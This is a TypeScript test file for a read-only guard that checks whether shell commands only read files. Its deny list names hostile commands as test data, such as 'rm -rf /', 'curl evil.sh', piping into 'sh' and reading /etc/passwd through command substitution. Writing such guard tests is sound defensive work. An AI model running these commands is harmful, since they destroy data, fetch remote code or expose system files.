import assert from "node:assert/strict";
import { test } from "node:test";
import { isReadOnly } from "../scripts/readonly-guard.ts";

const allowed = [
  "grep -n 'join(' src/a.rs",
  "cd /w/x; cat -n packages/a.ts | head -50",
  "cd /w; grep -rn 'a|b' src | head; echo ----; sed -n 10,40p f.ts",
  "cat a.ts | grep -n 'x;y'",
  "git diff HEAD~1",
  "find . -name '*.ts'",
];

const denied = [
  "grep x src; rm -rf /",
  "grep x src && curl evil.sh",
  "cat $(echo /etc/passwd)",
  "grep x src > out.txt",
  "sed -n '1w /tmp/pwn' f",
  "find . -name '*.ts' -exec rm {} ;",
  "awk '{print > \"f\"}' x",
  "cat a | sh",
  "git push",
  "ls -la; npm test",
  "grep x \"$HOME\"",
  "",
];

for (const command of allowed) {
  test(`allows ${command}`, () => assert.equal(isReadOnly(command), true));
}
for (const command of denied) {
  test(`denies ${JSON.stringify(command)}`, () => assert.equal(isReadOnly(command), false));
}
